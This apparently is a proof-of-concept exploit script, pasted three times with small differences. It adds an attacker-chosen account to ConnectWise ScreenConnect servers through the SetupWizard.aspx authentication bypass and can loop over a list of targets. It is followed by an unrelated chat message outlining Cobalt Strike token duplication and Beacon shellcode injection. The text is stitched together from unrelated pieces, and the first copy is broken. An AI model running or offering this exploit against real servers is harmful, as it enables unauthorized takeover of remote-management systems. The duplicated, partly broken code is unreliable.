import re
import argparse

banner = """			 __         ___  ___________
__  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________
\\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\

watchtowr-vs-ConnectWise_2024-02-21.py
- Sonny, watchTowr (sonny@watchTowr.com)
"""

helptext =  """
Example Usage:
- python watchtowr-vs-ConnectWise_2024-02-21.py --url http://localhost --username hellothere --password admin123!

"""

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--url", help="target url in the format https://localhost", default=False, action="store", required=True)
parser.add_argument("--username", help="username to add", required=False, action="store")
parser.add_argument("--password", help="password to add (must be at least 8 characters in length)", required=False, action="store")
try:
args = parser.parse_args()
except:
print(banner)
print(helptext)
raise

print(banner)


requests.urllib3.disable_warnings()


def search(target):
print(f"[*] Target Server: {target} ")
print(f"[*] Adding Username: {args.username} ")
print(f"[*] Adding Password: {args.password} ")

initial_request = requests.get(url=target+"/SetupWizard.aspx/",verify=False)

viewstate_1 = re.search(r'value="([^"]+)"', initial_request.text).group(1)
viewgen_1 = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', initial_request.text).group(1)

next_data = {"__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": viewstate_1, "__VIEWSTATEGENERATOR": viewgen_1, "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
next_request = requests.post(url=target+"/SetupWizard.aspx/",data=next_data, verify=False)

exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
exploit_viewgen =  re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate, "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": args.username, "ctl00$Main$wizard$emailBox": args.username+"@poc.com", "ctl00$Main$wizard$passwordBox": args.password, "ctl00$Main$wizard$verifyPasswordBox": args.password, "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}

exploit_request = requests.post(url=target+"/SetupWizard.aspx/",data=exploit_data, verify=False)

print(f"[*] Successfully added user")

for line in open(args.url,'r'):
search(line)
else:
search(args.url)

import requests
import re
import os.path
import argparse

banner = """			 __         ___  ___________
__  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________
\\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
\\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
\\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|
\\/          \\/     \\/

watchtowr-vs-ConnectWise_2024-02-21.py
- Sonny, watchTowr (sonny@watchTowr.com)
"""

helptext =  """
Example Usage:
- python watchtowr-vs-ConnectWise_2024-02-21.py --url http://localhost --username hellothere --password admin123!

"""

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--url", help="target url in the format https://localhost", default=False, action="store", required=True)
parser.add_argument("--username", help="username to add", required=False, action="store")
parser.add_argument("--password", help="password to add (must be at least 8 characters in length)", required=False, action="store")
try:
args = parser.parse_args()
except:
print(banner)
print(helptext)
raise

print(banner)


requests.urllib3.disable_warnings()


def search(target):
print(f"[*] Target Server: {target} ")
print(f"[*] Adding Username: {args.username} ")
print(f"[*] Adding Password: {args.password} ")

initial_request = requests.get(url=target+"/SetupWizard.aspx/",verify=False)

viewstate_1 = re.search(r'value="([^"]+)"', initial_request.text).group(1)
viewgen_1 = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', initial_request.text).group(1)

next_data = {"__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": viewstate_1, "__VIEWSTATEGENERATOR": viewgen_1, "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
next_request = requests.post(url=target+"/SetupWizard.aspx/",data=next_data, verify=False)

exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
exploit_viewgen =  re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate, "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": args.username, "ctl00$Main$wizard$emailBox": args.username+"@poc.com", "ctl00$Main$wizard$passwordBox": args.password, "ctl00$Main$wizard$verifyPasswordBox": args.password, "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}

exploit_request = requests.post(url=target+"/SetupWizard.aspx/",data=exploit_data, verify=False)

print(f"[*] Successfully added user")

if os.path.isfile(args.url):
for line in open(args.url,'r'):
search(line)
else:
search(args.url)

import requests
import re
import os.path
import argparse

banner = """			 __         ___  ___________
__  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________
\\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
\\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
\\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|
\\/          \\/     \\/

watchtowr-vs-ConnectWise_2024-02-21.py
- Sonny, watchTowr (sonny@watchTowr.com)
"""

helptext =  """
Example Usage:
- python watchtowr-vs-ConnectWise_2024-02-21.py --url http://localhost --username hellothere --password admin123!

"""

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--url", help="target url in the format https://localhost", default=False, action="store", required=True)
parser.add_argument("--username", help="username to add", required=False, action="store")
parser.add_argument("--password", help="password to add (must be at least 8 characters in length)", required=False, action="store")
try:
args = parser.parse_args()
except:
print(banner)
print(helptext)
raise

print(banner)


requests.urllib3.disable_warnings()


def search(target):
try:

print(f"[*] Target Server: {target} ")
print(f"[*] Adding Username: {args.username} ")
print(f"[*] Adding Password: {args.password} ")

initial_request = requests.get(url=target+"/SetupWizard.aspx/",verify=False,timeout=10)

viewstate_1 = re.search(r'value="([^"]+)"', initial_request.text).group(1)
viewgen_1 = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', initial_request.text).group(1)

next_data = {"__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": viewstate_1, "__VIEWSTATEGENERATOR": viewgen_1, "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
next_request = requests.post(url=target+"/SetupWizard.aspx/",data=next_data, verify=False,timeout=10)

exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
exploit_viewgen =  re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate, "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": args.username, "ctl00$Main$wizard$emailBox": args.username+"@poc.com", "ctl00$Main$wizard$passwordBox": args.password, "ctl00$Main$wizard$verifyPasswordBox": args.password, "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}

exploit_request = requests.post(url=target+"/SetupWizard.aspx/",data=exploit_data, verify=False,timeout=10)

print(f"[*] Successfully added user")
except:
print(f"{target} failed")

if os.path.isfile(args.url):
for line in open(args.url,'r'):
search(line)
else:
search(args.url)

[2024-02-22 17:58:12] @usernamenn:matrix.bestflowers247.online:

1) Obtain a handle to the target process.
2) Obtain a handle to the process' primary token.
3) Duplicate the primary token to an impersonation token.
4) Get the Beacon spawnto value.
5) Attempt to spawn a new process with the duplicated token using CreateProcessWithTokenW.
‚ó¶ If this attempt fails, try CreateProcessAsUserW.
6) Inject the Beacon shellcode into the spawned process.
‚ó¶ Link to the Beacon in the case of P2P.
```
